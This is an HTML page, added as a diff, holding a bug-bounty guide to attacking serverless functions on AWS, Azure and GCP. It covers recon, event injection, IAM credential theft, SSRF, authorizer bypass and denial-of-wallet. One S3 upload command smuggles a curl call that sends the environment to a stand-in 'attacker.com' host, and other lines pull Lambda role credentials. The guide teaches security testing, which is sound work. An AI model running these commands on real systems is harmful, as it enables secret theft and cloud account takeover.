@@ -1,0 +1,898 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <!-- ME1: Dark mode — runs before render to prevent FOUC -->
+    <script>
+      (function() {
+        var saved = localStorage.getItem('theme');
+        if (saved) {
+          document.documentElement.setAttribute('data-theme', saved);
+        } else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+          document.documentElement.setAttribute('data-theme', 'dark');
+          localStorage.setItem('theme', 'dark');
+        }
+      })();
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Test serverless applications for injection, privilege escalation, and data exposure across AWS Lambda, Azure Functions, and GCP Cloud Functions.">
+    <title>Serverless Security Testing: Attacking AWS Lambda, Azure Functions, and GCP Cloud Functions</title>
+    
+    <!-- Canonical URL -->
+    <link rel="canonical" href="https://bughuntertools.com/articles/serverless-security-testing-bug-bounty-guide-2026/">
+    
+    <!-- Open Graph / Facebook -->
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://bughuntertools.com/articles/serverless-security-testing-bug-bounty-guide-2026/">
+    <meta property="og:title" content="Serverless Security Testing: Attacking AWS Lambda, Azure Functions, and GCP Cloud Functions">
+    <meta property="og:description" content="Test serverless applications for injection, privilege escalation, and data exposure across AWS Lambda, Azure Functions, and GCP Cloud Functions.">
+    <meta property="og:site_name" content="Bug Hunter Tools">
+    
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://bughuntertools.com/articles/serverless-security-testing-bug-bounty-guide-2026/">
+    <meta name="twitter:title" content="Serverless Security Testing: Attacking AWS Lambda, Azure Functions, and GCP Cloud Functions">
+    <meta name="twitter:description" content="Test serverless applications for injection, privilege escalation, and data exposure across AWS Lambda, Azure Functions, and GCP Cloud Functions.">
+    
+    <!-- Google Fonts: Inter (UI) + JetBrains Mono (code) -->
+    <link rel="stylesheet" href="/css/fonts.css">
+
+    <link rel="stylesheet" href="/css/style.css">
+    
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-PP6M3SZSVR"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-PP6M3SZSVR');
+    </script>
+    
+    <!-- AI Agent Referrer Tracking -->
+    <script>
+      (function() {
+        var ua = navigator.userAgent || '';
+        var ref = document.referrer || '';
+        var aiSource = null;
+        
+        // Detect AI agents by User-Agent
+        if (ua.includes('ChatGPT-User') || ua.includes('ChatGPT')) {
+          aiSource = 'chatgpt';
+        } else if (ua.includes('Claude') || ua.includes('Anthropic')) {
+          aiSource = 'claude';
+        } else if (ua.includes('PerplexityBot') || ua.includes('Perplexity')) {
+          aiSource = 'perplexity';
+        } else if (ua.includes('GPTBot')) {
+          aiSource = 'openai_crawler';
+        } else if (ua.includes('ClaudeBot') || ua.includes('anthropic-ai')) {
+          aiSource = 'anthropic_crawler';
+        } else if (ua.includes('Bard') || ua.includes('Gemini')) {
+          aiSource = 'google_gemini';
+        } else if (ref.includes('chat.openai.com')) {
+          aiSource = 'chatgpt_referrer';
+        } else if (ref.includes('claude.ai')) {
+          aiSource = 'claude_referrer';
+        } else if (ref.includes('perplexity.ai')) {
+          aiSource = 'perplexity_referrer';
+        }
+        
+        // Send custom event if AI agent detected
+        if (aiSource) {
+          gtag('event', 'ai_agent_visit', {
+            'ai_source': aiSource,
+            'page_path': window.location.pathname,
+            'user_agent': ua
+          });
+          
+          // Set custom dimension
+          gtag('set', {'ai_visitor': aiSource});
+          
+          // Log to console for debugging
+          console.log('AI Agent detected:', aiSource);
+        }
+      })();
+    </script>
+    
+    <!-- Affiliate Link Click Tracking -->
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        // Track clicks on Amazon affiliate links (tag=altclaw-20)
+        var links = document.querySelectorAll('a[href*="amazon.com"][href*="altclaw-20"]');
+        links.forEach(function(link) {
+          link.addEventListener('click', function(e) {
+            var href = this.href;
+            var asin = (href.match(/\/dp\/([A-Z0-9]{10})/) || [])[1] || 'unknown';
+            var label = this.textContent.trim().substring(0, 60) || asin;
+            gtag('event', 'affiliate_click', {
+              'event_category': 'affiliate',
+              'event_label': label,
+              'affiliate_product': asin,
+              'affiliate_program': 'amazon',
+              'page_path': window.location.pathname
+            });
+          });
+        });
+      });
+    </script>
+
+    <!-- Google AdSense Verification -->
+    <meta name="google-adsense-account" content="ca-pub-9373816755142401">
+
+    <!-- Google AdSense -->
+    
+    <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-9373816755142401" crossorigin="anonymous"></script>
+    
+
+    <!-- Schema.org markup -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "WebPage",
+      "name": "Serverless Security Testing: Attacking AWS Lambda, Azure Functions, and GCP Cloud Functions",
+      "description": "Test serverless applications for injection, privilege escalation, and data exposure across AWS Lambda, Azure Functions, and GCP Cloud Functions.",
+      "url": "https://bughuntertools.com/articles/serverless-security-testing-bug-bounty-guide-2026/"
+    }
+    </script>
+</head>
+<body>
+    <!-- Sticky Navigation Bar -->
+    <div class="sticky-nav">
+        <div class="container sticky-nav-inner">
+            <a href="/" class="sticky-nav-logo">🔍 Bug Hunter Tools</a>
+            <div class="sticky-nav-links">
+                <a href="/">Home</a>
+                <a href="/articles/">Articles</a>
+                <a href="/categories/">Categories</a>
+                <a href="/demos/">SecurityClaw Demos</a>
+                <a href="/articles/security-testing-tools-2026/">Tools</a>
+                <a href="/about/">About</a>
+                <a href="/privacy.html">Privacy</a>
+            </div>
+            <button class="dark-mode-toggle" aria-label="Toggle dark mode">🌙</button>
+        </div>
+    </div>
+
+    
+    <!-- Breadcrumb Navigation -->
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+        <div class="container">
+            <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/">
+                        <span itemprop="name">Home</span>
+                    </a>
+                    <meta itemprop="position" content="1" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <a itemprop="item" href="/articles/">
+                        <span itemprop="name">Articles</span>
+                    </a>
+                    <meta itemprop="position" content="2" />
+                </li>
+                <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+                    <span itemprop="name">Serverless Security Testing: Attacking AWS Lambda, Azure Functions, and GCP Cloud Functions</span>
+                    <meta itemprop="position" content="3" />
+                </li>
+            </ol>
+        </div>
+    </nav>
+    
+
+    
+
+    <main class="container">
+        
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "Serverless Security Testing for Bug Bounty in 2026: How to Find and Exploit Vulnerabilities in AWS Lambda, Azure Functions, and GCP Cloud Functions",
+  "description": "Learn how to test serverless applications for bug bounty. Covers AWS Lambda, Azure Functions, GCP Cloud Functions — event injection, privilege escalation, data exfiltration, and real-world attack chains.",
+  "datePublished": "2026-04-14",
+  "dateModified": "2026-04-14",
+  "author": {
+    "@type": "Organization",
+    "name": "BugHunterTools"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "BugHunterTools"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://bughuntertools.com/articles/serverless-security-testing-bug-bounty-guide-2026/"
+  }
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    { "@type": "ListItem", "position": 1, "name": "Home", "item": "https://bughuntertools.com/" },
+    { "@type": "ListItem", "position": 2, "name": "Articles", "item": "https://bughuntertools.com/articles/" },
+    { "@type": "ListItem", "position": 3, "name": "Serverless Security Testing for Bug Bounty in 2026" }
+  ]
+}
+</script>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "What are the most common serverless vulnerabilities in bug bounty?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "The most common serverless vulnerabilities include event injection (injecting malicious payloads through API Gateway, S3 events, or SQS messages), overprivileged IAM roles, insecure environment variables storing secrets in plaintext, broken authentication on API endpoints, and server-side request forgery through function-to-function calls."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How do I identify serverless applications during recon?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Look for API Gateway endpoints (execute-api.amazonaws.com, azurewebsites.net/api, cloudfunctions.net), response headers like x-amzn-requestid or x-functions-key, cold start latency patterns (200-500ms spikes on first request), and CloudFront distributions fronting API Gateway origins."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Can you get RCE on serverless functions?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Yes. While the execution environment is ephemeral, command injection and code injection in serverless functions give you a shell in the container. From there you can read environment variables (often containing secrets), access the IAM role credentials at the metadata endpoint, pivot to other cloud services, and exfiltrate data. The impact is real even though the container is temporary."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What tools are best for serverless security testing?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "For black-box testing: Burp Suite for API Gateway interception, ffuf for endpoint fuzzing, and nuclei with cloud-specific templates. For white-box or gray-box: Prowler and ScoutSuite for IAM auditing, Serverless Framework's own debugging tools, and custom scripts to enumerate Lambda function URLs and API Gateway stages."
+      }
+    }
+  ]
+}
+</script>
+
+<article>
+<div class="article-header">
+<h1>Serverless Security Testing for Bug Bounty in 2026</h1>
+<p class="subtitle">How to Find and Exploit Vulnerabilities in AWS Lambda, Azure Functions, and GCP Cloud Functions</p>
+</div>
+
+<div class="key-takeaways">
+<h2>Key Takeaways</h2>
+<ul>
+<li>Serverless doesn't mean secure — functions inherit all the classic web vulns plus cloud-specific attack surface</li>
+<li>Event injection is the #1 serverless-specific bug class: untrusted data flows from API Gateway, S3, SQS, and dozens of other triggers directly into function code</li>
+<li>Overprivileged IAM roles on Lambda functions are extremely common and turn any code execution into full cloud account compromise</li>
+<li>Environment variables frequently contain hardcoded secrets — any code execution gives you access to them</li>
+<li>Cold start timing analysis reveals serverless architectures even when fronted by CDNs</li>
+</ul>
+</div>
+
+<nav class="toc">
+<h2>Table of Contents</h2>
+<ol>
+<li><a href="#why-serverless">Why Serverless Is a Growing Bug Bounty Target</a></li>
+<li><a href="#recon">Reconnaissance: Identifying Serverless Targets</a></li>
+<li><a href="#event-injection">Event Injection Attacks</a></li>
+<li><a href="#iam-exploitation">IAM Role Exploitation</a></li>
+<li><a href="#env-secrets">Environment Variable and Secret Extraction</a></li>
+<li><a href="#ssrf-pivot">SSRF and Cloud Pivoting</a></li>
+<li><a href="#auth-bypass">Authentication and Authorization Bypass</a></li>
+<li><a href="#deserialization">Deserialization in Serverless Contexts</a></li>
+<li><a href="#dos">Denial of Service and Financial Exhaustion</a></li>
+<li><a href="#tools">Tools and Methodology</a></li>
+<li><a href="#report-writing">Writing Serverless Bug Reports</a></li>
+<li><a href="#faq">FAQ</a></li>
+</ol>
+</nav>
+
+<section id="why-serverless">
+<h2>Why Serverless Is a Growing Bug Bounty Target</h2>
+
+<p>Serverless adoption has exploded. AWS Lambda alone processes trillions of invocations per month. Every major bug bounty program — from fintech startups to Fortune 500 companies — runs serverless workloads. And most of them are vulnerable.</p>
+
+<p>The misconception that "serverless = no server = no attack surface" has led to widespread security neglect. Developers focus on business logic and assume the cloud provider handles security. The provider secures the runtime — but everything above it (your code, your IAM policies, your event handling) is your problem.</p>
+
+<p>For bug bounty hunters, this creates opportunity. Serverless applications expose unique attack surface that traditional web app testing misses:</p>
+
+<ul>
+<li><strong>Event-driven triggers</strong> — functions respond to API calls, file uploads, queue messages, database changes, and IoT events. Each trigger is a potential injection point.</li>
+<li><strong>Ephemeral execution</strong> — functions spin up, execute, and die. Traditional persistence techniques don't work, but data exfiltration and lateral movement absolutely do.</li>
+<li><strong>IAM-based access control</strong> — instead of network segmentation, serverless relies on IAM policies. Misconfigurations here are catastrophic.</li>
+<li><strong>Multi-service integration</strong> — a single function might touch S3, DynamoDB, SQS, SNS, and external APIs. Each integration is an attack vector.</li>
+</ul>
+</section>
+
+<section id="recon">
+<h2>Reconnaissance: Identifying Serverless Targets</h2>
+
+<h3>Fingerprinting Serverless Endpoints</h3>
+
+<p>Before you can test serverless functions, you need to find them. Here are the telltale signs:</p>
+
+<p><strong>AWS Lambda + API Gateway:</strong></p>
+<ul>
+<li>URLs matching <code>*.execute-api.{region}.amazonaws.com/{stage}/</code></li>
+<li>Response headers: <code>x-amzn-requestid</code>, <code>x-amz-apigw-id</code>, <code>x-amzn-trace-id</code></li>
+<li>Lambda Function URLs: <code>*.lambda-url.{region}.on.aws</code></li>
+<li>Error responses containing <code>"message": "Internal server error"</code> with no stack trace (API Gateway default)</li>
+</ul>
+
+<p><strong>Azure Functions:</strong></p>
+<ul>
+<li>URLs matching <code>*.azurewebsites.net/api/</code></li>
+<li>Response headers: <code>x-functions-key</code>, <code>request-id</code></li>
+<li>Custom domains with <code>/api/</code> path prefix pattern</li>
+</ul>
+
+<p><strong>GCP Cloud Functions:</strong></p>
+<ul>
+<li>URLs matching <code>*.cloudfunctions.net</code> or <code>*.run.app</code></li>
+<li>Response headers: <code>function-execution-id</code>, <code>x-cloud-trace-context</code></li>
+</ul>
+
+<h3>Cold Start Timing Analysis</h3>
+
+<p>Serverless functions exhibit a distinctive timing pattern. The first request after idle time takes 200ms-2s longer than subsequent requests (cold start). You can detect this even behind CDNs:</p>
+
+<pre><code># Send 10 requests with 5-minute gaps and measure response times
+for i in $(seq 1 10); do
+  curl -o /dev/null -s -w "Request $i: %{time_total}s\n" https://target.com/api/endpoint
+  sleep 300
+done</code></pre>
+
+<p>If you see consistent spikes on the first request of each batch, you're hitting a serverless function.</p>
+
+<h3>Enumerating API Gateway Stages</h3>
+
+<p>API Gateway deployments use stages (dev, staging, prod). Developers often leave non-production stages exposed:</p>
+
+<pre><code># Common stage names to enumerate
+stages=("prod" "dev" "staging" "test" "v1" "v2" "api" "beta" "sandbox")
+for stage in "${stages[@]}"; do
+  code=$(curl -o /dev/null -s -w "%{http_code}" "https://api-id.execute-api.us-east-1.amazonaws.com/$stage/")
+  echo "$stage: $code"
+done</code></pre>
+
+<p>Non-production stages frequently have weaker authentication, verbose error messages, and debug endpoints.</p>
+</section>
+
+<section id="event-injection">
+<h2>Event Injection Attacks</h2>
+
+<p>Event injection is the signature vulnerability class of serverless architectures. Unlike traditional web apps where input comes through HTTP, serverless functions receive events from dozens of sources — and developers rarely sanitize all of them.</p>
+
+<h3>API Gateway Event Injection</h3>
+
+<p>When API Gateway triggers a Lambda function, it passes the entire HTTP request as a JSON event. The function code parses this event to extract parameters. Common injection points:</p>
+
+<ul>
+<li><strong>Query string parameters</strong> — passed in <code>event.queryStringParameters</code></li>
+<li><strong>Path parameters</strong> — passed in <code>event.pathParameters</code></li>
+<li><strong>Headers</strong> — passed in <code>event.headers</code> (including custom headers)</li>
+<li><strong>Body</strong> — passed in <code>event.body</code> (often base64-encoded)</li>
+</ul>
+
+<p>Test each of these for SQL injection, NoSQL injection, command injection, and template injection. The function code often trusts these values because "API Gateway validated them" — but API Gateway only validates structure, not content.</p>
+
+<h3>S3 Event Injection</h3>
+
+<p>Functions triggered by S3 uploads receive the bucket name and object key in the event. If the function uses the object key in a shell command or database query without sanitization:</p>
+
+<pre><code># Upload a file with a malicious filename
+aws s3 cp payload.txt "s3://target-bucket/; curl attacker.com/exfil?data=$(env | base64);"</code></pre>
+
+<p>The object key flows into <code>event.Records[0].s3.object.key</code> and if the function does something like <code>os.system(f"process {key}")</code>, you have command injection.</p>
+
+<h3>SQS/SNS Message Injection</h3>
+
+<p>If you can write to an SQS queue or publish to an SNS topic that triggers a function, the message body becomes your injection payload. Look for:</p>
+
+<ul>
+<li>Publicly writable SQS queues (misconfigured resource policies)</li>
+<li>SNS topics that accept subscriptions from any AWS account</li>
+<li>API endpoints that forward user input to queues without sanitization</li>
+</ul>
+
+<h3>DynamoDB Stream Injection</h3>
+
+<p>Functions triggered by DynamoDB Streams receive the new/old item data. If you can write to the DynamoDB table (via another vulnerability or misconfigured access), your data flows directly into the function as a trusted event.</p>
+</section>
+
+<section id="iam-exploitation">
+<h2>IAM Role Exploitation</h2>
+
+<p>Every Lambda function runs with an IAM execution role. This role determines what AWS services the function can access. In practice, developers almost always grant more permissions than needed.</p>
+
+<h3>Common Overprivileged Patterns</h3>
+
+<ul>
+<li><code>s3:*</code> on <code>*</code> — function needs to read one bucket but can access all buckets in the account</li>
+<li><code>dynamodb:*</code> — function needs GetItem but has PutItem, DeleteTable, etc.</li>
+<li><code>sts:AssumeRole</code> — function can assume other roles, potentially escalating to admin</li>
+<li><code>lambda:InvokeFunction</code> on <code>*</code> — function can invoke any other function in the account</li>
+</ul>
+
+<h3>Extracting and Using IAM Credentials</h3>
+
+<p>If you achieve code execution in a Lambda function (via command injection, deserialization, etc.), the IAM role credentials are available at a well-known endpoint:</p>
+
+<pre><code># Inside a compromised Lambda function
+# AWS_LAMBDA_RUNTIME_API provides the credentials
+curl "http://${AWS_LAMBDA_RUNTIME_API}/2018-06-01/runtime/credentials"
+
+# Or via environment variables (always present)
+echo $AWS_ACCESS_KEY_ID
+echo $AWS_SECRET_ACCESS_KEY
+echo $AWS_SESSION_TOKEN</code></pre>
+
+<p>These temporary credentials let you make AWS API calls with the function's permissions from your own machine. If the role is overprivileged, you can:</p>
+
+<ul>
+<li>List and download S3 objects across the account</li>
+<li>Read DynamoDB tables containing user data</li>
+<li>Invoke other Lambda functions</li>
+<li>Enumerate the entire cloud environment</li>
+</ul>
+
+<p>This is where serverless bugs become critical-severity findings. A simple command injection in a Lambda function with <code>AdministratorAccess</code> (yes, people do this) gives you full account takeover.</p>
+</section>
+
+<section id="env-secrets">
+<h2>Environment Variable and Secret Extraction</h2>
+
+<p>Serverless functions commonly store configuration in environment variables. Developers treat these as "secure" because they're not in source code — but any code execution in the function exposes them all.</p>
+
+<h3>What You'll Find</h3>
+
+<ul>
+<li>Database connection strings with credentials</li>
+<li>API keys for third-party services (Stripe, Twilio, SendGrid)</li>
+<li>JWT signing secrets</li>
+<li>Encryption keys</li>
+<li>Internal service URLs and tokens</li>
+</ul>
+
+<h3>Extraction via Error Messages</h3>
+
+<p>Even without full code execution, verbose error messages can leak environment variables. Try triggering errors by:</p>
+
+<ul>
+<li>Sending malformed JSON bodies</li>
+<li>Exceeding payload size limits (6MB for Lambda synchronous)</li>
+<li>Triggering type errors with unexpected data types</li>
+<li>Sending requests to non-existent routes (some frameworks dump config in 404 handlers)</li>
+</ul>
+
+<p>If the function uses a framework like Express.js on Lambda and has debug mode enabled, error responses may include the full environment.</p>
+</section>
+
+<section id="ssrf-pivot">
+<h2>SSRF and Cloud Pivoting</h2>
+
+<p>SSRF in serverless functions is particularly dangerous because the function runs inside the cloud provider's network with access to internal services. See our <a href="/articles/ssrf-to-rce-escalation-bug-bounty-guide-2026/">SSRF to RCE Escalation guide</a> for the general methodology — here we focus on serverless-specific pivots.</p>
+
+<h3>AWS Lambda SSRF Targets</h3>
+
+<ul>
+<li><strong>IAM credentials endpoint</strong> — <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> (if the function makes HTTP requests you can control)</li>
+<li><strong>Lambda Runtime API</strong> — <code>http://${AWS_LAMBDA_RUNTIME_API}/</code> (can read next invocation events, potentially containing sensitive data from other requests)</li>
+<li><strong>Internal VPC resources</strong> — if the Lambda is VPC-attached, you can reach private RDS instances, ElastiCache, internal APIs</li>
+</ul>
+
+<h3>Cross-Function Invocation</h3>
+
+<p>If the compromised function's IAM role allows <code>lambda:InvokeFunction</code>, you can call other functions in the account. Each function may have different permissions, creating a privilege escalation chain:</p>
+
+<p>Function A (public-facing, limited perms) → Function B (internal, has S3 access) → Function C (admin, has IAM access)</p>
+
+<p>Map the function graph by listing available functions and their configurations. Each hop potentially escalates your access.</p>
+</section>
+
+<section id="auth-bypass">
+<h2>Authentication and Authorization Bypass</h2>
+
+<p>Serverless APIs commonly use API Gateway authorizers — Lambda functions that validate tokens before the main function executes. These authorizers are a rich target.</p>
+
+<h3>Authorizer Bypass Techniques</h3>
+
+<ul>
+<li><strong>Missing authorizer on specific routes</strong> — developers add authorizers to most routes but miss one. Enumerate all API paths and check which ones require authentication.</li>
+<li><strong>Authorizer caching</strong> — API Gateway caches authorizer responses by default (300 seconds). If the cache key is only the token, a valid token cached for one user may authorize requests for another user on the same API.</li>
+<li><strong>Method-level bypass</strong> — authorizer configured for GET but not POST on the same resource. Try all HTTP methods.</li>
+<li><strong>Stage-level bypass</strong> — authorizer configured on prod stage but not dev stage. If both stages point to the same Lambda functions, the dev stage gives unauthenticated access to production data.</li>
+</ul>
+
+<h3>Cognito Misconfiguration</h3>
+
+<p>Many serverless apps use AWS Cognito for authentication. Common misconfigurations:</p>
+
+<ul>
+<li>Self-registration enabled when it shouldn't be</li>
+<li>Unverified email/phone allowed to access protected resources</li>
+<li>Custom attributes writable by the user (e.g., <code>custom:role</code> set to "admin")</li>
+<li>Identity pool configured with unauthenticated access to sensitive AWS resources</li>
+</ul>
+
+<p>For more authentication attack patterns, see our <a href="/articles/authentication-bypass-bug-bounty-guide-2026/">Authentication Bypass guide</a> and <a href="/articles/oauth-attacks-bug-bounty-guide-2026/">OAuth Attacks guide</a>.</p>
+</section>
+
+<section id="deserialization">
+<h2>Deserialization in Serverless Contexts</h2>
+
+<p>Serverless functions frequently deserialize data from events. The serialization format depends on the trigger:</p>
+
+<ul>
+<li><strong>API Gateway</strong> — JSON (sometimes XML for SOAP-style APIs)</li>
+<li><strong>S3 events</strong> — the object content itself may be deserialized (pickle files, Java serialized objects)</li>
+<li><strong>SQS/SNS</strong> — JSON message bodies, sometimes containing nested serialized data</li>
+<li><strong>Step Functions</strong> — JSON state passed between functions</li>
+</ul>
+
+<p>Python Lambda functions using <code>pickle.loads()</code> on S3 object content are a classic target. Upload a malicious pickle file to the trigger bucket and the function deserializes it, giving you code execution. See our <a href="/articles/insecure-deserialization-bug-bounty-guide-2026/">Insecure Deserialization guide</a> for payload construction.</p>
+</section>
+
+<section id="dos">
+<h2>Denial of Service and Financial Exhaustion</h2>
+
+<p>Serverless functions scale automatically — which means an attacker can force the target to scale to thousands of concurrent executions, generating massive cloud bills. This is called a "denial of wallet" attack.</p>
+
+<h3>Attack Vectors</h3>
+
+<ul>
+<li><strong>Direct invocation flooding</strong> — send thousands of requests to a public API endpoint</li>
+<li><strong>Recursive function triggers</strong> — if a function writes to a resource that triggers the same function (e.g., Lambda writes to S3, S3 triggers Lambda), you create an infinite loop</li>
+<li><strong>Large payload processing</strong> — send maximum-size payloads (6MB) to force expensive processing</li>
+<li><strong>Slow-read attacks</strong> — keep connections open to consume concurrent execution slots</li>
+</ul>
+
+<h3>Reporting Financial Impact</h3>
+
+<p>When reporting denial-of-wallet bugs, calculate the financial impact. Lambda pricing is per-request and per-GB-second. A function with 512MB memory running for 1 second costs ~$0.0000083. At 10,000 requests/second sustained for 1 hour, that's $299. At scale, this adds up fast.</p>
+
+<p>Programs increasingly accept financial exhaustion as a valid vulnerability class. Frame it as "attacker-controlled cost amplification" in your report.</p>
+</section>
+
+<section id="tools">
+<h2>Tools and Methodology</h2>
+
+<h3>Reconnaissance Tools</h3>
+
+<ul>
+<li><strong>ffuf</strong> — fuzz API Gateway endpoints and stages</li>
+<li><strong>nuclei</strong> — cloud-specific templates for serverless fingerprinting</li>
+<li><strong>gau / waybackurls</strong> — find historical API Gateway URLs in archives</li>
+<li><strong>Amass / subfinder</strong> — discover subdomains pointing to serverless endpoints</li>
+</ul>
+
+<h3>Exploitation Tools</h3>
+
+<ul>
+<li><strong>Burp Suite</strong> — intercept and modify API Gateway requests, test authorizer bypass</li>
+<li><strong>Pacu</strong> — AWS exploitation framework, useful for post-exploitation after obtaining Lambda credentials</li>
+<li><strong>Prowler</strong> — AWS security auditing (useful in gray-box engagements)</li>
+</ul>
+
+<h3>Testing Methodology Checklist</h3>
+
+<ol>
+<li><strong>Recon</strong> — identify serverless endpoints, enumerate stages, fingerprint provider</li>
+<li><strong>Auth testing</strong> — test every endpoint with no auth, expired tokens, tokens from other users</li>
+<li><strong>Input testing</strong> — fuzz all event sources (query params, headers, body, path params) for injection</li>
+<li><strong>Error analysis</strong> — trigger errors to leak configuration, environment variables, stack traces</li>
+<li><strong>SSRF probing</strong> — test any URL parameter for SSRF to cloud metadata endpoints</li>
+<li><strong>Rate limit testing</strong> — check for missing throttling on API Gateway (see our <a href="/articles/api-rate-limiting-bypass-bug-bounty-guide-2026/">API Rate Limiting Bypass guide</a>)</li>
+<li><strong>Stage comparison</strong> — compare security controls across API Gateway stages</li>
+<li><strong>Financial impact</strong> — assess denial-of-wallet potential</li>
+</ol>
+</section>
+
+<section id="report-writing">
+<h2>Writing Serverless Bug Reports</h2>
+
+<p>Serverless bugs require extra context in reports because triagers may not understand the cloud-specific impact. Include:</p>
+
+<ul>
+<li><strong>The trigger source</strong> — explain which event source you're injecting through</li>
+<li><strong>The execution context</strong> — what IAM permissions the function has (if you can determine this)</li>
+<li><strong>The blast radius</strong> — what other services/data the compromised function can access</li>
+<li><strong>Cloud-specific impact</strong> — translate technical findings into business impact (e.g., "the function's IAM role has read access to the production DynamoDB table containing 2M user records")</li>
+</ul>
+
+<p>For general report writing tips, see our <a href="/articles/bug-bounty-starter-kit/">Bug Bounty Starter Kit</a>.</p>
+</section>
+
+<section id="faq">
+<h2>Frequently Asked Questions</h2>
+
+<h3>What are the most common serverless vulnerabilities in bug bounty?</h3>
+<p>Event injection (injecting malicious payloads through API Gateway, S3 events, or SQS messages), overprivileged IAM roles, insecure environment variables storing secrets in plaintext, broken authentication on API endpoints, and SSRF through function-to-function calls.</p>
+
+<h3>How do I identify serverless applications during recon?</h3>
+<p>Look for API Gateway endpoints (execute-api.amazonaws.com, azurewebsites.net/api, cloudfunctions.net), response headers like x-amzn-requestid or x-functions-key, cold start latency patterns, and CloudFront distributions fronting API Gateway origins.</p>
+
+<h3>Can you get RCE on serverless functions?</h3>
+<p>Yes. Command injection and code injection give you a shell in the container. From there you can read environment variables containing secrets, access IAM role credentials, pivot to other cloud services, and exfiltrate data. The container is ephemeral but the impact is real.</p>
+
+<h3>What tools are best for serverless security testing?</h3>
+<p>For black-box: Burp Suite, ffuf, and nuclei with cloud templates. For gray-box: Prowler, ScoutSuite, and Pacu for post-exploitation. Custom scripts for enumerating Lambda function URLs and API Gateway stages.</p>
+</section>
+
+<section class="related-articles">
+<h2>Related Articles</h2>
+<ul>
+<li><a href="/articles/ssrf-to-rce-escalation-bug-bounty-guide-2026/">SSRF to RCE Escalation for Bug Bounty in 2026</a></li>
+<li><a href="/articles/api-security-testing-methodology-bug-bounty-guide-2026/">API Security Testing Methodology for Bug Bounty in 2026</a></li>
+<li><a href="/articles/authentication-bypass-bug-bounty-guide-2026/">Authentication Bypass for Bug Bounty in 2026</a></li>
+<li><a href="/articles/insecure-deserialization-bug-bounty-guide-2026/">Insecure Deserialization for Bug Bounty in 2026</a></li>
+<li><a href="/articles/api-rate-limiting-bypass-bug-bounty-guide-2026/">API Rate Limiting Bypass for Bug Bounty in 2026</a></li>
+<li><a href="/articles/cicd-pipeline-security-testing-bug-bounty-guide-2026/">CI/CD Pipeline Security Testing for Bug Bounty in 2026</a></li>
+<li><a href="/articles/cloud-pentesting-methodology-bug-bounty-guide-2026/">Cloud Pentesting Methodology for Bug Bounty in 2026</a></li>
+</ul>
+</section>
+
+</article>
+
+
+        
+        
+        <div class="ad-container ad-below-article">
+            <p class="ad-label">Advertisement</p>
+            <ins class="adsbygoogle"
+                 style="display:block"
+                 data-ad-client="ca-pub-9373816755142401"
+                 data-ad-slot="9879569728"
+                 data-ad-format="auto"
+                 data-full-width-responsive="true"></ins>
+            <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+        </div>
+        
+        
+    </main>
+
+    <footer>
+        <div class="container footer-inner">
+            <span class="footer-updated">Last updated: 16 Apr 2026, 08:48 GMT</span>
+            <p>&copy; 2026 Bug Hunter Tools. All rights reserved. | <a href="/privacy.html" style="color: white;">Privacy Policy</a></p>
+        </div>
+    </footer>
+
+    <!-- ME1: Dark mode toggle handler -->
+    <script>
+      (function() {
+        var btn = document.querySelector('.dark-mode-toggle');
+        if (!btn) return;
+        function updateBtn() {
+          var dark = document.documentElement.getAttribute('data-theme') === 'dark';
+          btn.textContent = dark ? '☀️' : '🌙';
+          btn.setAttribute('aria-label', dark ? 'Switch to light mode' : 'Switch to dark mode');
+        }
+        updateBtn();
+        btn.addEventListener('click', function() {
+          var next = (document.documentElement.getAttribute('data-theme') === 'dark') ? 'light' : 'dark';
+          document.documentElement.setAttribute('data-theme', next);
+          localStorage.setItem('theme', next);
+          updateBtn();
+        });
+      })();
+    </script>
+
+    <!-- ME2: Article hero header + reading time badge -->
+    <script>
+      (function() {
+        var path = window.location.pathname;
+        var isArticle = path.startsWith('/articles/') && path !== '/articles/';
+        var isDemo    = path.startsWith('/demos/')    && path !== '/demos/';
+        if (!isArticle && !isDemo) return;
+        var article = document.querySelector('article');
+        if (!article) return;
+        var text  = article.innerText || '';
+        var words = text.trim().split(/\s+/).filter(Boolean).length;
+        var mins  = Math.max(1, Math.round(words / 238));
+        var badge = '<span class="reading-time-badge">&#9201; ' + mins + ' min read</span>';
+        var header = article.querySelector('header');
+        if (!header) return;
+        header.classList.add('article-hero-header');
+        var metaEl = header.querySelector('.meta, .article-meta');
+        if (metaEl) {
+          metaEl.classList.add('article-hero-meta');
